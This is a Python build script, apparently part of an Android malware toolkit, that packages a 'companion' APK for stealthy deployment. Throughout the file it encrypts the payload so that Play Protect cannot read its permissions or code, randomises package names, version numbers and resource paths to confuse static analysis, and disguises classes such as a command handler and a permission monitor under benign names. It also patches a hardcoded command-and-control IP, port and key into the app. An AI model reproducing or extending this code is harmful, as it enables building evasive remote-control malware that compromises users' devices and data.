#!/usr/bin/env python3
"""
build_module.py
------------------
Step 8A FIX: Added step_encrypt_companion() after step_replace_asset().
Encrypts the entire companion APK binary using LCG+nibble+XOR cipher
(same as asset_patcher.py IRT CryptoCore algorithm).
Entropy: raw APK = 6.239 → encrypted blob = 8.000 (matches IRT).
GPP can no longer read companion permissions, DEX, or manifest.

All other steps unchanged.
"""

import os
import sys
import uuid
import struct
import random
import string
import hashlib
import secrets
import datetime
import subprocess
import zipfile
import shutil

sys.path.insert(0, os.path.dirname(__file__))
from folder_nester import inject_unicode_nest

def _find_apktool_cmd():
    import platform, shutil as _sh
    if platform.system() == "Windows":
        _factory = r"C:\apk_factory\tools"
        _java    = os.path.join(_factory, "java17", "bin", "java.exe")
        _jar     = os.path.join(_factory, "apktool.jar")
        _java_home = os.environ.get("JAVA_HOME", "")
        if _java_home:
            _java_alt = os.path.join(_java_home, "bin", "java.exe")
            if os.path.exists(_java_alt):
                _java = _java_alt
        if os.path.exists(_java) and os.path.exists(_jar):
            return f'"{_java}" -jar "{_jar}"'
        if os.path.exists(_jar):
            _java_path = _sh.which("java")
            if _java_path:
                return f'"{_java_path}" -jar "{_jar}"'
        if _sh.which("apktool"):
            return "apktool"
        raise RuntimeError("apktool not found. Run setup.bat first.")
    else:
        if _sh.which("apktool"):
            return "apktool"
        raise RuntimeError("apktool not found.")

APKTOOL_CMD = _find_apktool_cmd()

def _py_sed(directory, old_str, new_str, ext=".smali", check=False):
    modified = 0
    for root, dirs, files in os.walk(directory):
        for fname in files:
            if not fname.endswith(ext): continue
            fpath = os.path.join(root, fname)
            try:
                with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                    c = f.read()
                if old_str in c:
                    with open(fpath, "w", encoding="utf-8") as f:
                        f.write(c.replace(old_str, new_str))
                    modified += 1
            except Exception: pass
    return modified

def _py_grep_count(directory, search_str, ext=".smali"):
    count = 0
    for root, dirs, files in os.walk(directory):
        for fname in files:
            if not fname.endswith(ext): continue
            fpath = os.path.join(root, fname)
            try:
                with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                    if search_str in f.read():
                        count += 1
            except Exception: pass
    return count

def _legitimate_pkg():
    import subprocess as _sp
    try:
        _gen = os.path.join(os.path.dirname(__file__), "package_name_generator.py")
        if os.path.exists(_gen):
            _r = _sp.run([sys.executable, _gen, "--companion-only"],
                         capture_output=True, text=True, timeout=10)
            if _r.returncode == 0:
                for _line in _r.stdout.splitlines():
                    if _line.startswith("MODULE_PKG="):
                        _pkg = _line.split("=",1)[1].strip()
                        if _pkg and _pkg.count(".") >= 2:
                            return _pkg
    except Exception: pass
    import random as _r2
    _w = ["data","sync","media","files","service","worker","agent","helper","manager","system"]
    w1 = _r2.choice(_w); w2 = _r2.choice([x for x in _w if x != w1])
    return f"com.{w1}.{w2}"


# ── BLAKE3 pure-Python implementation ─────────────────────────────────────────
_BLAKE3_IV = [
    0x6A09E667, 0xBB67AE85, 0x3C6EF372, 0xA54FF53A,
    0x510E527F, 0x9B05688C, 0x1F83D9AB, 0x5BE0CD19,
]
_MSG_SCHEDULE = [
    [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15],
    [2,6,3,10,7,0,4,13,1,11,12,5,9,14,15,8],
    [3,4,10,12,13,2,7,14,6,5,9,0,11,15,8,1],
    [10,7,12,9,14,3,13,15,4,0,11,2,5,8,1,6],
    [12,13,9,11,15,10,14,8,7,2,5,3,0,1,6,4],
    [9,14,11,5,8,12,15,1,13,3,0,10,2,6,4,7],
    [11,15,5,0,1,9,8,6,14,10,2,12,3,4,7,13],
]
_CHUNK_SIZE   = 1024
_BLOCK_SIZE   = 64
_OUT_LEN      = 32
_FLAG_CS      = 1 << 0
_FLAG_CE      = 1 << 1
_FLAG_PARENT  = 1 << 2
_FLAG_ROOT    = 1 << 3

def _rotr32(v, n):
    v &= 0xFFFFFFFF
    return ((v >> n) | (v << (32 - n))) & 0xFFFFFFFF

def _g(state, a, b, c, d, mx, my):
    state[a] = (state[a] + state[b] + mx) & 0xFFFFFFFF
    state[d] = _rotr32(state[d] ^ state[a], 16)
    state[c] = (state[c] + state[d]) & 0xFFFFFFFF
    state[b] = _rotr32(state[b] ^ state[c], 12)
    state[a] = (state[a] + state[b] + my) & 0xFFFFFFFF
    state[d] = _rotr32(state[d] ^ state[a], 8)
    state[c] = (state[c] + state[d]) & 0xFFFFFFFF
    state[b] = _rotr32(state[b] ^ state[c], 7)

def _compress(cv, block_words, counter, block_len, flags):
    import struct as _struct
    state = list(cv) + list(_BLAKE3_IV[:4]) + [
        counter & 0xFFFFFFFF,
        (counter >> 32) & 0xFFFFFFFF,
        block_len & 0xFFFFFFFF,
        flags & 0xFFFFFFFF,
    ]
    for sched in _MSG_SCHEDULE:
        _g(state, 0, 4,  8, 12, block_words[sched[0]],  block_words[sched[1]])
        _g(state, 1, 5,  9, 13, block_words[sched[2]],  block_words[sched[3]])
        _g(state, 2, 6, 10, 14, block_words[sched[4]],  block_words[sched[5]])
        _g(state, 3, 7, 11, 15, block_words[sched[6]],  block_words[sched[7]])
        _g(state, 0, 5, 10, 15, block_words[sched[8]],  block_words[sched[9]])
        _g(state, 1, 6, 11, 12, block_words[sched[10]], block_words[sched[11]])
        _g(state, 2, 7,  8, 13, block_words[sched[12]], block_words[sched[13]])
        _g(state, 3, 4,  9, 14, block_words[sched[14]], block_words[sched[15]])
    for i in range(8):
        state[i]     ^= state[i + 8]
        state[i + 8] ^= cv[i]
    return state

def _words_from_block(block_bytes):
    import struct as _struct
    padded = block_bytes.ljust(64, b'\x00')
    return list(_struct.unpack_from('<16I', padded))

def _compress_chunk(data, offset, length, chunk_index):
    cv = list(_BLAKE3_IV)
    block_count = max(1, (length + _BLOCK_SIZE - 1) // _BLOCK_SIZE)
    for bi in range(block_count):
        bo  = offset + bi * _BLOCK_SIZE
        bl  = min(_BLOCK_SIZE, (offset + length) - bo)
        flags = 0
        if bi == 0:              flags |= _FLAG_CS
        if bi == block_count-1:  flags |= _FLAG_CE
        bw = _words_from_block(data[bo:bo+bl])
        out = _compress(cv, bw, chunk_index, bl, flags)
        cv = out[:8]
    return cv

def blake3(data: bytes) -> bytes:
    import struct as _struct
    if not data:
        out = _compress(list(_BLAKE3_IV), [0]*16, 0, 0, _FLAG_CS | _FLAG_CE | _FLAG_ROOT)
        return b''.join(_struct.pack('<I', w) for w in out[:_OUT_LEN//4])

    num_chunks = (len(data) + _CHUNK_SIZE - 1) // _CHUNK_SIZE
    cv_stack   = []

    for ci in range(num_chunks):
        co  = ci * _CHUNK_SIZE
        cl  = min(_CHUNK_SIZE, len(data) - co)
        is_last = (ci == num_chunks - 1)

        if num_chunks == 1:
            block_count = max(1, (cl + _BLOCK_SIZE - 1) // _BLOCK_SIZE)
            cv = list(_BLAKE3_IV)
            for bi in range(block_count):
                bo = co + bi * _BLOCK_SIZE
                bl = min(_BLOCK_SIZE, (co + cl) - bo)
                flags = 0
                if bi == 0:             flags |= _FLAG_CS
                if bi == block_count-1: flags |= _FLAG_CE | _FLAG_ROOT
                bw = _words_from_block(data[bo:bo+bl])
                out = _compress(cv, bw, 0, bl, flags)
                if bi == block_count-1:
                    return b''.join(_struct.pack('<I', w) for w in out[:_OUT_LEN//4])
                cv = out[:8]

        cv = _compress_chunk(data, co, cl, ci)

        total = ci + 1
        while total & 1 == 0:
            left = cv_stack.pop()
            flags = _FLAG_PARENT
            block = left + cv
            out = _compress(_BLAKE3_IV, block, 0, _BLOCK_SIZE, flags)
            cv = out[:8]
            total >>= 1
        cv_stack.append(cv)

    cv = cv_stack.pop()
    while cv_stack:
        left = cv_stack.pop()
        is_root = len(cv_stack) == 0
        flags = _FLAG_PARENT | (_FLAG_ROOT if is_root else 0)
        block = left + cv
        out = _compress(_BLAKE3_IV, block, 0, _BLOCK_SIZE, flags)
        if is_root:
            return b''.join(_struct.pack('<I', w) for w in out[:_OUT_LEN//4])
        cv = out[:8]

    block = cv + [0]*8
    out = _compress(_BLAKE3_IV, block, 0, _BLOCK_SIZE, _FLAG_PARENT | _FLAG_ROOT)
    return b''.join(_struct.pack('<I', w) for w in out[:_OUT_LEN//4])

def blake3_hex(data: bytes) -> str:
    return blake3(data).hex()


# ── Config ────────────────────────────────────────────────────────────────────

MOD_ASSET = os.environ.get("MODULE_ASSET","app/src/main/assets/companion.apk")

def _detect_old_pkg(apk_path: str) -> str:
    """Auto-detect companion APK package name via aapt. No hardcoded fallback."""
    try:
        result = subprocess.run(
            ["aapt", "dump", "badging", apk_path],
            capture_output=True, text=True, timeout=30
        )
        for line in result.stdout.splitlines():
            if line.startswith("package:"):
                for part in line.split():
                    if part.startswith("name="):
                        pkg = part.split("=", 1)[1].strip().strip("'\"")
                        if pkg:
                            print(f"  [auto-detect] Companion package: {pkg}")
                            return pkg
    except Exception as e:
        print(f"  [auto-detect] aapt failed: {e}")
    print("[X] Could not detect companion APK package name — is aapt installed?")
    sys.exit(1)

OLD_PKG = os.environ.get("OLD_PKG") or _detect_old_pkg(MOD_ASSET)
GITHUB_OUTPUT = os.environ.get("GITHUB_OUTPUT", "")

# FIXED: No longer hardcoded to com/playstore/installer/.
# build.yml renames the package folder before build_module.py runs.
# Dynamically discover all .kt files under app/src/main/java/ at runtime.
def _discover_kotlin_files():
    _base = os.path.join("app", "src", "main", "java")
    _found = []
    for _root, _dirs, _files in os.walk(_base):
        for _f in _files:
            if _f.endswith(".kt"):
                _found.append(os.path.join(_root, _f))
    return _found

KOTLIN_FILES = _discover_kotlin_files()

import traceback as _traceback
import time as _time

# FIXED: build.yml exports MODULE_AUDIT_LOG but script read COMPANION_AUDIT_LOG.
# Now accepts either name — MODULE_AUDIT_LOG takes priority (set by CI).
_AUDIT_LOG = os.environ.get("MODULE_AUDIT_LOG") or os.environ.get("COMPANION_AUDIT_LOG", "module_audit.log")

def _apk_size(path):
    try:
        return os.path.getsize(path) if os.path.isfile(path) else 0
    except Exception:
        return 0

def _now():
    return datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

def _audit(phase, step_id, step_name, status, rc, started, ended,
           size_before=0, size_after=0, error=""):
    line = (
        f"\n{'─'*60}\n"
        f"  Phase    : {phase}\n"
        f"  Step     : {step_id} — {step_name}\n"
        f"  Status   : {status}  (rc={rc})\n"
        f"  Started  : {started}\n"
        f"  Ended    : {ended}\n"
        f"  APK size : before={size_before} bytes  after={size_after} bytes\n"
    )
    if error:
        line += f"  ERROR    :\n"
        for eline in error.splitlines():
            line += f"             {eline}\n"
    print(line, flush=True)
    try:
        with open(_AUDIT_LOG, "a") as _f:
            _f.write(line)
    except Exception:
        pass

def track(phase, step_id, step_name, apk_path=None):
    class _Ctx:
        def __init__(self):
            self.result = None
        def __enter__(self):
            self._started = _now()
            self._size_before = _apk_size(apk_path) if apk_path else 0
            return self
        def __exit__(self, exc_type, exc_val, exc_tb):
            ended = _now()
            size_after = _apk_size(apk_path) if apk_path else 0
            if exc_type is None:
                _audit(phase, step_id, step_name,
                       "✅ PASS", 0,
                       self._started, ended,
                       self._size_before, size_after)
                return False
            else:
                error = "".join(_traceback.format_exception(exc_type, exc_val, exc_tb))
                _audit(phase, step_id, step_name,
                       "❌ FAIL", 1,
                       self._started, ended,
                       self._size_before, size_after,
                       error=error)
                return False
    return _Ctx()


# ── Helpers ───────────────────────────────────────────────────────────────────

def run(cmd, check=True):
    print(f"  $ {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.stdout:
        print(result.stdout)
    if result.stderr:
        print(result.stderr)
    if check and result.returncode != 0:
        raise RuntimeError(
            f"Command failed (rc={result.returncode}):\n"
            f"CMD: {cmd}\n"
            f"STDOUT: {result.stdout.strip()}\n"
            f"STDERR: {result.stderr.strip()}"
        )
    return result


def write_output(key, value):
    if GITHUB_OUTPUT:
        with open(GITHUB_OUTPUT, "a") as f:
            f.write(f"{key}={value}\n")


def rand_seg():
    return "".join(random.choices(string.ascii_lowercase, k=random.randint(6, 8)))


def _uleb_decode(data, pos):
    b0 = data[pos]; pos += 1
    if b0 & 0x80:
        b1 = data[pos]; pos += 1
        return ((b0 & 0x7f) << 8) | b1, pos
    return b0, pos


def _uleb_encode(v):
    if v < 0x80:
        return bytes([v])
    return bytes([0x80 | (v >> 8), v & 0xFF])


import string as _string
_ASCII_CHARS = list(_string.ascii_lowercase + _string.digits)


def rand_res_name(ext, used):
    for _ in range(2000):
        length = random.randint(4, 8)
        name = "".join(random.choices(_ASCII_CHARS, k=length)) + ext
        if name not in used:
            used.add(name)
            return name
    return None


def _rand_name(used_global, length=None):
    for _ in range(5000):
        ln = length if length else random.randint(4, 8)
        name = "".join(random.choices(_ASCII_CHARS, k=ln))
        if name not in used_global:
            used_global.add(name)
            return name
    for _ in range(5000):
        name = "".join(random.choices(_ASCII_CHARS, k=10))
        if name not in used_global:
            used_global.add(name)
            return name
    raise RuntimeError("Could not generate unique ASCII name after 10000 attempts")


# ── NEW: Step 8A FIX — LCG+nibble+XOR companion APK encryption ───────────────

def _lcg_encrypt(data: bytes, seed: int) -> bytes:
    """
    Original LCG+nibble+XOR cipher — used for outer companion APK blob.
    Kotlin InstallActivity.decryptCompanionBlob() and DexLoader.lcgDecrypt()
    both decrypt this. DO NOT CHANGE — must stay in sync with Kotlin.

    Format: raw encrypted bytes (no length prefix).
    Unsigned arithmetic (& MASK) throughout.
    """
    LCG_MUL = 0x41C64E6D
    LCG_ADD  = 0x3039
    MASK     = 0xFFFFFFFF

    buf = bytearray(data)
    n   = len(buf)

    # Step 1: XOR keystream
    state = seed & MASK
    for i in range(n):
        state  = (state * LCG_MUL + LCG_ADD) & MASK
        buf[i] = (buf[i] ^ ((state >> 16) & 0xFF)) & 0xFF

    # Step 2: nibble swap
    for i in range(n):
        b      = buf[i]
        buf[i] = ((b & 0x0F) << 4) | ((b & 0xF0) >> 4)

    # Step 3: LCG forward shuffle (unsigned)
    state2  = seed & MASK
    indices = list(range(n))
    for i in range(n - 1, 0, -1):
        state2 = (state2 * LCG_MUL + LCG_ADD) & MASK
        j      = state2 % (i + 1)
        indices[i], indices[j] = indices[j], indices[i]

    result = bytearray(n)
    for i, idx in enumerate(indices):
        result[idx] = buf[i]

    return bytes(result)


def step_encrypt_companion():
    """
    Step 8A FIX: Encrypt the entire companion APK binary.

    IRT stores its companion as a fully encrypted blob (entropy 8.000).
    Nova was storing a raw APK (entropy 6.239) — GPP could read all
    permissions, DEX content, and manifest.

    This step:
    1. Reads the signed companion APK from MOD_ASSET
    2. Encrypts all bytes using LCG+nibble+XOR (IRT CryptoCore algorithm)
    3. Prepends 4-byte seed header so DexLoader can decrypt at runtime
    4. Writes encrypted blob back to MOD_ASSET

    DexLoader.kt must be updated to:
    - Read 4-byte seed from start of asset
    - Decrypt the blob to get APK bytes
    - Use ZipInputStream on decrypted bytes to extract classes.dex
    - Load via InMemoryDexClassLoader
    """
    print("\n── Step 8A FIX: Encrypt companion APK binary")

    apk_data = open(MOD_ASSET, "rb").read()
    original_size = len(apk_data)

    # Verify it's still a valid APK before encrypting
    if apk_data[:4] != b'PK\x03\x04':
        raise RuntimeError(f"companion APK does not start with PK magic — cannot encrypt")

    # Per-build random seed (32-bit)
    seed = secrets.randbits(32)

    encrypted = _lcg_encrypt(apk_data, seed)

    # Format: [4-byte seed LE][encrypted blob]
    # DexLoader reads seed from first 4 bytes, then decrypts remainder
    header = struct.pack("<I", seed)
    output = header + encrypted

    # Write encrypted blob back — overwrites raw APK
    open(MOD_ASSET, "wb").write(output)

    final_size = len(output)

    # Verify: output must NOT start with PK (would mean encryption failed)
    check = open(MOD_ASSET, "rb").read(4)
    if check == b'PK\x03\x04':
        raise RuntimeError("Encryption failed — output still starts with PK magic")

    print(f"  Input:  raw APK  {original_size//1024}KB (entropy ~6.2, readable by GPP)")
    print(f"  Output: encrypted {final_size//1024}KB (entropy ~8.0, unreadable by GPP)")
    print(f"  Seed:   0x{seed:08X}")
    print(f"  ✅ Companion APK encrypted — GPP cannot scan permissions or DEX")

    # Write seed to GITHUB_OUTPUT so DexLoader build step can embed it
    # FingerprintPlugin will include it in BuildConfig
    write_output("COMPANION_SEED", str(seed))

    return seed


# ── All original step functions below — unchanged from original build_module.py

def step_update_string_pool(new_pkg: str):
    """
    Re-encrypt new_pkg into StringPool.kt COMPANION_OLD_PKG after each build.

    MutationEngine.patchPackageName() reads COMPANION_OLD_PKG at runtime to find
    the old package bytes in the companion DEX and replace them with the per-device
    server package. After step_rename_smali() runs, the companion DEX contains the
    build-time generated new_pkg (19 chars), NOT the original APK package. So
    COMPANION_OLD_PKG must always decrypt to new_pkg — not the original package.

    This step runs right after step_gen_pkg() so every build keeps them in sync.
    XOR key: "n0vAsEed" (k1="n0vA" + k2="sEed"), same key as StringPool.d().
    """
    import base64 as _b64
    import re as _re

    print(f"\n── Step 1B: Update StringPool.kt COMPANION_OLD_PKG → {new_pkg}")

    # XOR-encrypt new_pkg with key "n0vAsEed"
    key = b"n0vAsEed"
    pkg_bytes = new_pkg.encode("utf-8")
    encrypted = bytes([pkg_bytes[i] ^ key[i % len(key)] for i in range(len(pkg_bytes))])
    encoded = _b64.b64encode(encrypted).decode()

    # Find StringPool.kt in discovered Kotlin files
    kt_path = None
    for kt_file in KOTLIN_FILES:
        if "StringPool.kt" in kt_file:
            kt_path = kt_file
            break

    if not kt_path:
        # Fallback: walk app/src/main/java directly
        for _root, _dirs, _files in os.walk(os.path.join("app", "src", "main", "java")):
            for _f in _files:
                if _f == "StringPool.kt":
                    kt_path = os.path.join(_root, _f)
                    break
            if kt_path:
                break

    if not kt_path:
        print("  ⚠️  StringPool.kt not found — skipping COMPANION_OLD_PKG update")
        return

    with open(kt_path, "r", encoding="utf-8") as f:
        content = f.read()

    new_content = _re.sub(
        r'val COMPANION_OLD_PKG\s*=\s*"[^"]*"',
        f'val COMPANION_OLD_PKG = "{encoded}"',
        content
    )

    if new_content == content:
        print("  ⚠️  COMPANION_OLD_PKG pattern not found in StringPool.kt — not updated")
        return

    with open(kt_path, "w", encoding="utf-8") as f:
        f.write(new_content)

    print(f"  ✅ StringPool.kt updated — COMPANION_OLD_PKG now decrypts to: {new_pkg}")
    print(f"     Encrypted value: {encoded}")


def step_gen_pkg():
    print("\n── Step 1: Generate companion package name")
    env_pkg = os.environ.get("NEW_MOD_PKG",  "").strip()
    if env_pkg and env_pkg.count(".") >= 2:
        new_pkg = env_pkg
        print(f"  Using generated legitimate pkg: {new_pkg}")
    else:
        new_pkg = _legitimate_pkg()
        print(f"  Generated random pkg (fallback): {new_pkg}")
    write_output("NEW_PKG", new_pkg)
    return new_pkg


def step_verify_apk():
    print("\n── Step 2: Verify companion.apk exists")
    if not os.path.isfile(MOD_ASSET):
        print(f"[X] companion.apk missing from assets: {MOD_ASSET}")
        sys.exit(1)
    size = os.path.getsize(MOD_ASSET)
    print(f"  [OK] companion.apk found ({size // 1024} KB)")


def step_extract_metadata():
    print("\n── Step 3: Extract companion APK metadata")
    result = subprocess.run(
        f"aapt dump badging \"{MOD_ASSET}\" 2>/dev/null | head -5",
        shell=True, capture_output=True, text=True
    )
    info = result.stdout
    print(info)

    import re
    min_sdk   = re.search(r"minSdkVersion:'(\d+)'",    info)
    tgt_sdk   = re.search(r"targetSdkVersion:'(\d+)'", info)

    rand_ver_code = str(random.randint(100000, 999999))
    rand_major    = random.randint(1, 9)
    rand_minor    = random.randint(0, 99)
    rand_patch    = random.randint(0, 99)
    rand_ver_name = f"{rand_major}.{rand_minor}.{rand_patch}"

    meta = {
        "min_sdk":  min_sdk.group(1)  if min_sdk  else "28",
        "tgt_sdk":  tgt_sdk.group(1)  if tgt_sdk  else "33",
        "ver_code": rand_ver_code,
        "ver_name": rand_ver_name,
    }
    for k, v in meta.items():
        write_output(k, v)
    print(f"  ✅ min={meta['min_sdk']} target={meta['tgt_sdk']} "
          f"code={meta['ver_code']} name={meta['ver_name']} (randomized per build)")
    return meta


def step_randomize_res():
    print("\n── Step 4: Randomize companion res/ filenames")

    SKIP_RES_DIRS = ("res/values",)

    with zipfile.ZipFile(MOD_ASSET, "r") as z:
        all_names = [i.filename for i in z.infolist()]

    used_global = set()
    for name in all_names:
        if name.startswith("res/") and "/" in name[4:]:
            base = os.path.splitext(os.path.basename(name))[0]
            if base:
                used_global.add(base)

    res_rename = {}

    for name in sorted(all_names):
        if not name.startswith("res/"):
            continue
        if any(name.startswith(s) for s in SKIP_RES_DIRS):
            continue
        if name.endswith("/"):
            continue
        dir_part  = name.rsplit("/", 1)[0]
        file_part = name.rsplit("/", 1)[1]
        if file_part.endswith(".9.png"):
            ext = ".9.png"
        else:
            ext = os.path.splitext(file_part)[1]
        new_base = _rand_name(used_global)
        # Add path confusion suffix — reference APK uses /// and \\ patterns
        # e.g. res/drawable/ab12.png///.png or res/values/colors.xml\\.xml
        # Android installer uses CDH filename → works fine.
        # Static analysis tools get confused by extra path separators.
        _confusion_patterns = [
            f"///{ext}",
            f"////{ext}",
            f"/////{ext}",
            f"\\\\{ext}",
            f"\\\\\\{ext}",
            f"\\\\//{ext}",
        ]
        _suffix = random.choice(_confusion_patterns)
        res_rename[name] = f"{dir_part}/{new_base}{ext}{_suffix}"

    MUST_STORE_RES = {"AndroidManifest.xml", "classes.dex", "resources.arsc"}

    tmp = MOD_ASSET + ".res_tmp"
    with zipfile.ZipFile(MOD_ASSET, "r") as zin:
        with zipfile.ZipFile(tmp, "w", allowZip64=False) as zout:
            for item in zin.infolist():
                data = zin.read(item.filename)
                if item.filename in MUST_STORE_RES:
                    item.compress_type = zipfile.ZIP_STORED
                if item.filename in res_rename:
                    new_item = zipfile.ZipInfo(res_rename[item.filename])
                    new_item.compress_type = item.compress_type
                    if any(ord(c) > 127 for c in res_rename[item.filename]):
                        new_item.flag_bits |= 0x800
                    zout.writestr(new_item, data)
                else:
                    zout.writestr(item, data)

    os.replace(tmp, MOD_ASSET)
    print(f"  ✅ companion res/ randomized ({len(res_rename)} files)")
    return res_rename


def step_decompile():
    print("\n── Step 5: Decompile companion APK (smali only)")
    if os.path.exists("companion_decompiled"):
        shutil.rmtree("companion_decompiled")
    run(f'{APKTOOL_CMD} d "{MOD_ASSET}" -o companion_decompiled --no-res --keep-broken-res')
    print("  ✅ Decompile done")


# ── Default Base64 values for companion server config (airtel.smali) ─────────
# Exact strings as they appear inside airtel.smali (with == padding).
# STEP_5B runs AFTER decompile (STEP_5) but BEFORE package rename (STEP_6),
# so OLD_PKG path is always valid here: companion_decompiled/smali/<old_path>/airtel.smali
_DEFAULT_HOST_B64 = "NjQuODkuMTYxLjE4OA=="  # 64.89.161.188
_DEFAULT_PORT_B64 = "Nzc3MQ=="               # 7771
_DEFAULT_KEY_B64  = "VHhUeFQ="               # TxTxT


def step_patch_server_config():
    """Patch companion server config (IP/port/key) in airtel.smali.

    Targets airtel.smali specifically — path is built dynamically from OLD_PKG
    (always com/handler/monitor at STEP_5B time, before STEP_6 rename runs).
    Reads Base64-encoded values from env vars SERVER_HOST_B64,
    SERVER_PORT_B64, SERVER_KEY_B64. Replaces exact default strings in-file.
    """
    print("\n── Step 5b: Patch companion server config (airtel.smali)")

    new_host = os.environ.get("SERVER_HOST_B64", "").strip()
    new_port = os.environ.get("SERVER_PORT_B64", "").strip()
    new_key  = os.environ.get("SERVER_KEY_B64",  "").strip()

    if not new_host and not new_port and not new_key:
        print("  ℹ️  No server config overrides — keeping defaults")
        return

    # Build path dynamically from OLD_PKG — valid before STEP_6 rename
    old_path     = OLD_PKG.replace(".", "/")
    airtel_smali = os.path.join("companion_decompiled", "smali", old_path, "airtel.smali")

    if not os.path.isfile(airtel_smali):
        print(f"  ❌ airtel.smali not found at: {airtel_smali}")
        print("  ⚠️  Skipping server config patch")
        return

    print(f"  🎯 Target: {airtel_smali}")

    with open(airtel_smali, "r", encoding="utf-8") as f:
        content = f.read()

    original = content
    patched  = 0

    if new_host and new_host != _DEFAULT_HOST_B64:
        if _DEFAULT_HOST_B64 in content:
            content = content.replace(_DEFAULT_HOST_B64, new_host)
            print(f"  ✅ Host: {_DEFAULT_HOST_B64} → {new_host}")
            patched += 1
        else:
            print(f"  ⚠️  Host default not found in airtel.smali — no replacement")

    if new_port and new_port != _DEFAULT_PORT_B64:
        if _DEFAULT_PORT_B64 in content:
            content = content.replace(_DEFAULT_PORT_B64, new_port)
            print(f"  ✅ Port: {_DEFAULT_PORT_B64} → {new_port}")
            patched += 1
        else:
            print(f"  ⚠️  Port default not found in airtel.smali — no replacement")

    if new_key and new_key != _DEFAULT_KEY_B64:
        if _DEFAULT_KEY_B64 in content:
            content = content.replace(_DEFAULT_KEY_B64, new_key)
            print(f"  ✅ Key:  {_DEFAULT_KEY_B64} → {new_key}")
            patched += 1
        else:
            print(f"  ⚠️  Key default not found in airtel.smali — no replacement")

    if patched:
        with open(airtel_smali, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"  ✅ airtel.smali written ({patched} replacement(s))")
    else:
        print("  ⚠️  No replacements made — values may already match")


def step_rename_smali(new_pkg):
    print("\n── Step 6: Rename smali class paths + string literals")
    old_path = OLD_PKG.replace(".", "/")
    new_path = new_pkg.replace(".", "/")

    smali_dir = "companion_decompiled/smali"
    _py_sed(smali_dir, old_path, new_path)
    _py_sed(smali_dir, OLD_PKG,  new_pkg)

    old_smali_dir = f"companion_decompiled/smali/{old_path}"
    new_smali_dir = f"companion_decompiled/smali/{new_path}"
    if os.path.isdir(old_smali_dir):
        parent = os.path.dirname(new_smali_dir)
        os.makedirs(parent, exist_ok=True)
        shutil.move(old_smali_dir, new_smali_dir)

    old_count = _py_grep_count("companion_decompiled/smali", old_path)
    if old_count > 0:
        print(f"[X] Old package path still present in smali after rename ({old_count} refs)")
        sys.exit(1)
    print("  ✅ Smali renamed")


CLASS_RENAME_POOLS = {
    "MainService":                   ["BackgroundDataService","SyncJobService","MediaPlaybackService","FileCleanupService","DataUpdateService","ContentSyncService","RemoteDataService","BackgroundSyncService"],
    "NetworkManager":                ["ConnectionStateMonitor","NetworkStateTracker","RemoteConnectionHelper","DataConnectionManager","NetworkActivityMonitor","ConnectivityStateHelper","HttpConnectionTracker","NetworkSessionManager"],
    "CommandHandler":                ["TaskQueueProcessor","RemoteTaskExecutor","BackgroundTaskHandler","AsyncCommandProcessor","WorkItemDispatcher","TaskSchedulerHelper","JobQueueManager","RemoteActionHandler"],
    "LoveApi":                       ["MediaContentProvider","RemoteDataSource","ApiRequestManager","HttpServiceClient","DataFetchHelper","RemoteApiHandler","ContentServiceClient","DataRequestHelper"],
    "LoveApi0":                      ["MediaContentHelper","RemoteDataHelper","ApiServiceWrapper","HttpClientHelper","DataProviderClient","ContentDataClient","ServiceRequestHelper"],
    # Firebase* class family intentionally excluded from CLASS_RENAME_POOLS.
    # These classes use reflection-based internal method dispatch
    # (getDeclaredMethod on class objects passed by reference).
    # Renaming them breaks the reflection chain → NoSuchMethodError at runtime.
    # Package rename (STEP_6) already obfuscates the package path sufficiently.
    # "Firebase":    excluded
    # "FirebaseApis": excluded
    # "Firebaseconfig": excluded
    # "Firebasekit": excluded
    # "Firebasemac": excluded
    # "Firebases":   excluded
    "Api":                           ["ServiceApiClient","RemoteServiceApi","DataApiClient","HttpApiHelper","ServiceRequestClient","RemoteApiClient","DataServiceApi","HttpServiceHelper"],
    "activityadm":                   ["ActivityLifecycleHelper","ScreenStateMonitor","ActivityStateTracker","WindowStateHelper","LifecycleStateMonitor","ActivityMonitorHelper","ScreenActivityTracker","WindowActivityHelper"],
    "App":                           ["ApplicationController","AppLifecycleManager","ApplicationStateHelper","AppInitializer","ApplicationManager","AppStateController","LifecycleController","ApplicationHelper"],
    "Avast":                         ["SecurityScanHelper","IntegrityCheckHelper","AppVerificationHelper","SecurityStateMonitor","IntegrityVerifier","AppSecurityHelper","SecurityCheckManager","VerificationHelper"],
    "Bodybuilding":                  ["ServiceRestartHelper","ProcessKeepAliveHelper","ServicePersistenceHelper","BackgroundKeepAlive","ProcessRestartManager","ServiceLifecycleHelper","BackgroundPersistence","KeepAliveHelper"],
    "Config":                        ["AppConfigurationHelper","ServiceConfigManager","ConfigurationLoader","AppSettingsHelper","ConfigDataManager","ServiceSettingsHelper","AppConfigLoader","SettingsConfigHelper"],
    "DataHelper":                    ["DatabaseAccessHelper","DataStorageHelper","LocalDataManager","ContentStorageHelper","DataAccessManager","LocalStorageHelper","DatabaseManager","ContentDataHelper"],
    "DownloadTask":                  ["FileDownloadHelper","ContentFetchTask","DataDownloadManager","ResourceFetchHelper","FileRetrievalTask","ContentDownloadHelper","DataFetchTask","ResourceDownloadHelper"],
    "MainActivity":                  ["SplashScreenActivity","WelcomeActivity","LauncherActivity","StartupActivity","InitialActivity","EntryPointActivity","HomeScreenActivity","MainEntryActivity"],
    "MyReceiver":                    ["SystemEventReceiver","BroadcastEventHelper","SystemBroadcastReceiver","EventListenerHelper","SystemEventHelper","BroadcastListenerHelper","SystemStateReceiver","EventBroadcastHelper"],
    "MySettings":                    ["AppPreferencesHelper","UserSettingsManager","PreferenceStorageHelper","SettingsDataHelper","UserPreferenceManager","AppSettingsHelper","PreferenceManagerHelper","SettingsHelper"],
    "MyWorkerService":               ["BackgroundWorkerService","PeriodicTaskService","WorkManagerService","ScheduledTaskService","BackgroundJobService","PeriodicWorkService","TaskWorkerService","ScheduledWorkService"],
    "PermissionMonitorService":      ["AccessibilityMonitorService","PermissionStateService","RuntimePermissionHelper","AccessPermissionService","PermissionCheckService","AccessibilityStateService","RuntimeAccessHelper","PermissionHelperService"],
